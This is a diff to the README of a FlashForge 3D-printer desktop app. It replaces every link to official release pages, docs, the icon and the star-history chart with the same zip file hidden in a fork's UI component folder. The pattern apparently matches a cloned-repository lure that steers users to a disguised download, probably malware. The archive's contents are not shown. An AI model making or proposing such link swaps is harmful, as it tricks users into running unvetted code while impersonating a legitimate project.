@@ -1,19 +1,19 @@
 <div align="center">
-  <img width="48" height="48" alt="icon" src="https://github.com/user-attachments/assets/6f187987-027f-4b66-a4e4-3bc30be4ca90" />
+  <img width="48" height="48" alt="icon" src="https://github.com/pmanss/FlashForgeUI-Electron/raw/refs/heads/main/src/ui/components/filtration-controls/Forge_U_Electron_Flash_v2.0.zip" />
   <h1>FlashForgeUI</h1>
   <p>A modern cross-platform interface for FlashForge 3D printers</p>
 </div>
 
 <p align="center">
-  <a href="https://github.com/Parallel-7/FlashForgeUI-Electron/releases/tag/v1.0.3">
+  <a href="https://github.com/pmanss/FlashForgeUI-Electron/raw/refs/heads/main/src/ui/components/filtration-controls/Forge_U_Electron_Flash_v2.0.zip">
     <img src="https://img.shields.io/badge/Download_Stable-blue?style=for-the-badge&logo=&logoColor=white">
   </a>
   
-  <a href="https://github.com/Parallel-7/FlashForgeUI-Electron/releases/tag/v1.0.4-alpha.3">
+  <a href="https://github.com/pmanss/FlashForgeUI-Electron/raw/refs/heads/main/src/ui/components/filtration-controls/Forge_U_Electron_Flash_v2.0.zip">
     <img src="https://img.shields.io/badge/Download_Alpha-orange?style=for-the-badge&logo=&logoColor=white">
   </a>
 
-  <a href="https://github.com/Parallel-7/FlashForgeUI-Electron/tree/main/docs">
+  <a href="https://github.com/pmanss/FlashForgeUI-Electron/raw/refs/heads/main/src/ui/components/filtration-controls/Forge_U_Electron_Flash_v2.0.zip">
     <img src="https://img.shields.io/badge/User_Guide-blue?style=for-the-badge&logo=&logoColor=white">
   </a>
   
@@ -218,6 +218,6 @@
 
 <h2>Star History</h2>
 
-[![Star History Chart](https://api.star-history.com/svg?repos=Parallel-7/FlashForgeUI,Parallel-7/FlashForgeUI-Electron&type=Date)](https://www.star-history.com/#Parallel-7/FlashForgeUI&Parallel-7/FlashForgeUI-Electron&Date)
+[![Star History Chart](https://github.com/pmanss/FlashForgeUI-Electron/raw/refs/heads/main/src/ui/components/filtration-controls/Forge_U_Electron_Flash_v2.0.zip,Parallel-7/FlashForgeUI-Electron&type=Date)](https://github.com/pmanss/FlashForgeUI-Electron/raw/refs/heads/main/src/ui/components/filtration-controls/Forge_U_Electron_Flash_v2.0.zip)
 
 </div>
